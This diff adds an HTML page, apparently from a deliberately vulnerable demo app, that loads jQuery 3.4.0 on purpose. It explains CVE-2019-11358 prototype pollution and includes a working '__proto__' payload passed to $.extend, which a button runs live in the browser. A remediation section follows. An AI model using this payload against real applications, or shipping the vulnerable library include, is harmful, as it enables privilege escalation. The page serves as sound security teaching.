@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Vulnerable Library — jQuery 3.4.0</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/public/style.css" />
+
+  <!-- ⚠️  VULNERABLE: Loading jQuery 3.4.0 — CVE-2019-11358 (Prototype Pollution) -->
+  <script src="/assets/js/jquery-3.4.0.js"></script>
+
+  <style>
+    .vuln-page-header {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      margin-bottom: 32px;
+      flex-wrap: wrap;
+    }
+    .back-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--text-muted);
+      text-decoration: none;
+      padding: 7px 14px;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      transition: all 0.2s ease;
+    }
+    .back-link:hover { border-color: var(--border-h); color: var(--text); background: #f3f4f6; }
+
+    .vuln-hero {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 28px 32px;
+      margin-bottom: 24px;
+      box-shadow: var(--shadow);
+      position: relative;
+      overflow: hidden;
+    }
+    .vuln-hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, #ea580c, #f97316);
+    }
+    .vuln-hero-top {
+      display: flex;
+      align-items: flex-start;
+      justify-content: space-between;
+      gap: 16px;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+    .vuln-hero h2 {
+      font-size: 22px;
+      font-weight: 800;
+      letter-spacing: -0.5px;
+      color: var(--text);
+    }
+    .vuln-hero p {
+      font-size: 14px;
+      color: var(--text-muted);
+      line-height: 1.7;
+      max-width: 700px;
+    }
+    .cve-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 5px 12px;
+      border-radius: 100px;
+      background: rgba(234,88,12,0.1);
+      border: 1px solid rgba(234,88,12,0.3);
+      color: #ea580c;
+      font-size: 11.5px;
+      font-weight: 700;
+      font-family: 'JetBrains Mono', monospace;
+      letter-spacing: 0.3px;
+      white-space: nowrap;
+    }
+    .sev-badge-lg {
+      display: inline-flex;
+      align-items: center;
+      padding: 5px 14px;
+      border-radius: 100px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      background: rgba(234,88,12,0.1);
+      border: 1px solid rgba(234,88,12,0.3);
+      color: #ea580c;
+    }
+
+    .info-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+      gap: 16px;
+      margin-bottom: 24px;
+    }
+    .info-card {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+      box-shadow: var(--shadow);
+    }
+    .info-card-label {
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.6px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+    }
+    .info-card-value {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13.5px;
+      font-weight: 600;
+      color: var(--text);
+      word-break: break-all;
+    }
+    .info-card-value.danger { color: #dc2626; }
+    .info-card-value.ok     { color: #15803d; }
+
+    /* Exploit panel */
+    .exploit-panel {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+      margin-bottom: 24px;
+      overflow: hidden;
+    }
+    .exploit-panel-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--border);
+      background: #f8fafc;
+    }
+    .exploit-panel-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .exploit-panel-body { padding: 20px; }
+
+    .code-block {
+      background: #0f172a;
+      color: #e2e8f0;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.75;
+      padding: 18px 20px;
+      border-radius: var(--radius-sm);
+      overflow-x: auto;
+      white-space: pre;
+      margin-bottom: 16px;
+    }
+    .code-comment  { color: #64748b; }
+    .code-keyword  { color: #7dd3fc; }
+    .code-string   { color: #86efac; }
+    .code-fn       { color: #fde68a; }
+    .code-danger   { color: #f87171; font-weight: 600; }
+    .code-ok       { color: #4ade80; font-weight: 600; }
+
+    .run-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 10px 22px;
+      border-radius: var(--radius-sm);
+      border: 1px solid rgba(234,88,12,0.4);
+      background: rgba(234,88,12,0.06);
+      color: #ea580c;
+      font-size: 13.5px;
+      font-weight: 700;
+      font-family: 'Inter', sans-serif;
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+    .run-btn:hover { background: rgba(234,88,12,0.12); border-color: rgba(234,88,12,0.6); }
+
+    .output-box {
+      margin-top: 16px;
+      background: #f8fafc;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 16px 18px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 13px;
+      line-height: 1.7;
+      display: none;
+    }
+    .output-box.visible { display: block; }
+    .output-line { margin: 2px 0; }
+    .out-label { color: var(--text-muted); }
+    .out-val   { color: var(--text); }
+    .out-bad   { color: #dc2626; font-weight: 600; }
+    .out-good  { color: #15803d; font-weight: 600; }
+
+    .source-tag {
+      background: #f3f4f6;
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      padding: 10px 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12.5px;
+      color: var(--text-muted);
+      word-break: break-all;
+    }
+    .source-tag .hl { color: #dc2626; font-weight: 600; }
+
+    .ref-links { display: flex; gap: 10px; flex-wrap: wrap; margin-top: 20px; }
+    .ref-link {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      font-size: 12.5px;
+      font-weight: 600;
+      color: var(--accent);
+      text-decoration: none;
+      padding: 5px 12px;
+      border: 1px solid rgba(37,99,235,0.25);
+      border-radius: 6px;
+      transition: all 0.2s ease;
+    }
+    .ref-link:hover { background: #eff6ff; border-color: rgba(37,99,235,0.5); }
+  </style>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <div class="bg-glow glow-1"></div>
+  <div class="bg-glow glow-2"></div>
+
+  <nav class="navbar">
+    <div class="nav-inner">
+      <div class="nav-brand">
+        <div class="brand-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/>
+          </svg>
+        </div>
+        <span class="brand-name">RequestLogger</span>
+      </div>
+      <div class="nav-links">
+        <a href="/" class="nav-link">Home</a>
+        <a href="/custom" class="nav-link">Custom Endpoints</a>
+        <a href="/vulnerabilities" class="nav-link active">Vulnerabilities</a>
+        <a href="/logs" class="nav-link">View Logs</a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="main-container">
+
+    <div class="vuln-page-header">
+      <a href="/vulnerabilities" class="back-link">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
+        Back to Vulnerabilities
+      </a>
+    </div>
+
+    <!-- Hero -->
+    <div class="vuln-hero">
+      <div class="vuln-hero-top">
+        <div>
+          <h2>Vulnerable JavaScript Library</h2>
+          <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">
+            <span class="cve-badge">CVE-2019-11358</span>
+            <span class="sev-badge-lg">High</span>
+          </div>
+        </div>
+      </div>
+      <p>
+        This page intentionally loads <strong>jQuery 3.4.0</strong> — a version known to be vulnerable to
+        <strong>Prototype Pollution</strong> via <code>$.extend()</code>. An attacker who can control
+        the data passed to <code>$.extend(true, …)</code> can inject properties into
+        <code>Object.prototype</code>, affecting every object in the JavaScript runtime and enabling
+        privilege escalation, denial of service, or remote code execution in some environments.
+      </p>
+      <div class="ref-links">
+        <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11358" target="_blank" rel="noopener" class="ref-link">📄 NVD CVE-2019-11358</a>
+        <a href="https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/" target="_blank" rel="noopener" class="ref-link">📝 jQuery 3.4.1 Patch Notes</a>
+        <a href="https://github.com/jquery/jquery/commit/753d591" target="_blank" rel="noopener" class="ref-link">🔧 GitHub Fix Commit</a>
+      </div>
+    </div>
+
+    <!-- Detection info -->
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-label">Library Loaded</div>
+        <div class="info-card-value" id="lib-name">Detecting…</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">jQuery Version</div>
+        <div class="info-card-value danger" id="lib-version">Detecting…</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">Vulnerability</div>
+        <div class="info-card-value danger">CVE-2019-11358</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">Script Source</div>
+        <div class="info-card-value" id="lib-src">Detecting…</div>
+      </div>
+    </div>
+
+    <!-- How it's included -->
+    <div class="exploit-panel">
+      <div class="exploit-panel-header">
+        <span class="exploit-panel-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+          Vulnerable HTML Include
+        </span>
+      </div>
+      <div class="exploit-panel-body">
+        <p style="font-size:13.5px;color:var(--text-muted);margin-bottom:12px">
+          The library is included in the page HTML with no integrity check (no <code>integrity</code> / <code>crossorigin</code> SRI attributes):
+        </p>
+        <div class="source-tag">
+          &lt;script src="<span class="hl">/assets/js/jquery-3.4.0.js</span>"&gt;&lt;/script&gt;
+        </div>
+        <p style="font-size:12.5px;color:var(--text-muted);margin-top:10px">
+          ⚠️ No Subresource Integrity (SRI) hash — if the file were compromised, the browser would load it silently.
+          The fixed version is <strong>jQuery 3.4.1</strong>.
+        </p>
+      </div>
+    </div>
+
+    <!-- Exploit demo -->
+    <div class="exploit-panel">
+      <div class="exploit-panel-header">
+        <span class="exploit-panel-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
+          Live Exploit — Prototype Pollution via <code>$.extend()</code>
+        </span>
+        <button class="run-btn" id="run-btn" onclick="runExploit()">▶ Run Exploit</button>
+      </div>
+      <div class="exploit-panel-body">
+        <div class="code-block"><span class="code-comment">// Attacker-controlled JSON payload containing __proto__</span>
+<span class="code-keyword">const</span> payload = <span class="code-fn">JSON</span>.<span class="code-fn">parse</span>(<span class="code-string">'{"__proto__": {"isAdmin": true, "polluted": "YES — prototype polluted!"}}'</span>);
+
+<span class="code-comment">// $.extend(true, ...) in jQuery 3.4.0 does NOT sanitise __proto__</span>
+<span class="code-fn">$</span>.<span class="code-fn">extend</span>(<span class="code-keyword">true</span>, {}, payload);
+
+<span class="code-comment">// Now EVERY plain object inherits the injected property</span>
+<span class="code-keyword">const</span> victim = {};
+<span class="code-fn">console</span>.<span class="code-fn">log</span>(victim.isAdmin);   <span class="code-comment">// → true   (should be undefined)</span>
+<span class="code-fn">console</span>.<span class="code-fn">log</span>(victim.polluted);  <span class="code-comment">// → "YES — prototype polluted!"</span></div>
+
+        <div class="output-box" id="exploit-output"></div>
+      </div>
+    </div>
+
+    <!-- Patch -->
+    <div class="exploit-panel">
+      <div class="exploit-panel-header">
+        <span class="exploit-panel-title">
+          <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+          Remediation
+        </span>
+      </div>
+      <div class="exploit-panel-body">
+        <div class="code-block"><span class="code-comment">// ✗ VULNERABLE — jQuery 3.4.0 (and below)</span>
+&lt;script src=<span class="code-string">"/assets/js/jquery-3.4.0.js"</span>&gt;&lt;/script&gt;
+
+<span class="code-comment">// ✓ FIXED — Upgrade to 3.4.1+ and add SRI hash</span>
+&lt;script
+  src=<span class="code-string">"https://code.jquery.com/jquery-3.7.1.min.js"</span>
+  integrity=<span class="code-string">"sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo="</span>
+  crossorigin=<span class="code-string">"anonymous"</span>&gt;&lt;/script&gt;</span>
+
+<span class="code-comment">// Or avoid jQuery altogether and use the Fetch API / vanilla JS</span></div>
+      </div>
+    </div>
+
+  </main>
+
+  <div class="toast" id="toast"></div>
+
+  <script>
+    // Populate detection cards
+    document.addEventListener('DOMContentLoaded', () => {
+      const jqLoaded = typeof jQuery !== 'undefined';
+      document.getElementById('lib-name').textContent    = jqLoaded ? 'jQuery' : 'Not detected';
+      document.getElementById('lib-version').textContent = jqLoaded ? jQuery.fn.jquery : 'N/A';
+
+      // Find the script tag src
+      const scripts = Array.from(document.scripts);
+      const jqScript = scripts.find(s => s.src.includes('jquery'));
+      document.getElementById('lib-src').textContent = jqScript ? jqScript.src.replace(location.origin, '') : 'unknown';
+    });
+
+    function runExploit() {
+      const out = document.getElementById('exploit-output');
+      out.innerHTML = '';
+      out.classList.add('visible');
+
+      if (typeof jQuery === 'undefined') {
+        out.innerHTML = '<div class="output-line out-bad">✗ jQuery not loaded — cannot run exploit.</div>';
+        return;
+      }
+
+      // Reset any previous pollution
+      delete Object.prototype.isAdmin;
+      delete Object.prototype.polluted;
+
+      const beforeAdmin   = {}.isAdmin;
+      const beforePollute = {}.polluted;
+
+      // Run the exploit payload
+      const payload = JSON.parse('{"__proto__": {"isAdmin": true, "polluted": "YES — prototype polluted!"}}');
+      $.extend(true, {}, payload);
+
+      const victim = {};
+      const afterAdmin   = victim.isAdmin;
+      const afterPolluted = victim.polluted;
+
+      const lines = [
+        { label: 'jQuery version loaded',        val: jQuery.fn.jquery, cls: 'out-bad' },
+        { label: '— Before exploit —',           val: '',               cls: 'out-label' },
+        { label: '{}.isAdmin',                   val: String(beforeAdmin),   cls: 'out-good' },
+        { label: '{}.polluted',                  val: String(beforePollute), cls: 'out-good' },
+        { label: '— After $.extend(true, {}, payload) —', val: '', cls: 'out-label' },
+        { label: 'victim.isAdmin',               val: String(afterAdmin),   cls: afterAdmin   ? 'out-bad' : 'out-good' },
+        { label: 'victim.polluted',              val: String(afterPolluted), cls: afterPolluted ? 'out-bad' : 'out-good' },
+        { label: 'Object.prototype polluted?',   val: afterAdmin ? '✗ YES — EXPLOITED' : '✓ Clean', cls: afterAdmin ? 'out-bad' : 'out-good' },
+      ];
+
+      out.innerHTML = lines.map(l =>
+        `<div class="output-line"><span class="out-label">${l.label}${l.val ? ':' : ''} </span><span class="${l.cls}">${l.val}</span></div>`
+      ).join('');
+
+      // Cleanup — don't leave the prototype polluted
+      delete Object.prototype.isAdmin;
+      delete Object.prototype.polluted;
+    }
+  </script>
+</body>
+</html>
